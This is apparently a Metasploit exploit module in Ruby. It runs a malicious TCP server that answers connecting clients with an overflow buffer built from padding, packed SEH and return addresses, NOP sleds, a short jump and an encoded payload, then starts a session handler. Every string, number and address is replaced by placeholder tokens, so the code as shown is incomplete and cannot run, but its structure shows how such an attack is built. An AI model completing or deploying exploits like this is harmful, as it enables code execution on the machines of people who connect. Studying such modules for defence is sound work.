class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: TcpServer include Msf :: Exploit :: Remote :: Seh def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > [ <hex> , <hex> , <hex> , ] } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptPort . new ( <str> , [ true , <str> , <int> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def on_client_connect ( client ) return unless regenerate_payload ( client ) print_status ( <str> ) buffer = <str> datastore [ <str> ] <str> client . put ( buffer ) end def on_client_data ( client ) client . get_once select ( nil , nil , nil , <int> ) sploit = <str> + Rex :: Text . rand_text_alphanumeric ( <int> ) + [ target [ <str> ] [ <int> ] ] . pack ( <str> ) + [ target [ <str> ] [ <int> ] ] . pack ( <str> ) sploit << make_nops ( <int> ) + [ target [ <str> ] [ <int> ] ] . pack ( <str> ) + make_nops ( <int> ) + <str> * <int> sploit << Rex :: Arch :: X86 . jmp_short ( <int> ) + Rex :: Text . rand_text_alphanumeric ( <int> ) sploit << make_nops ( <int> ) + payload . encoded + make_nops ( <int> ) + <str> client . put ( sploit ) handler ( client ) service . close_client ( client ) end end 
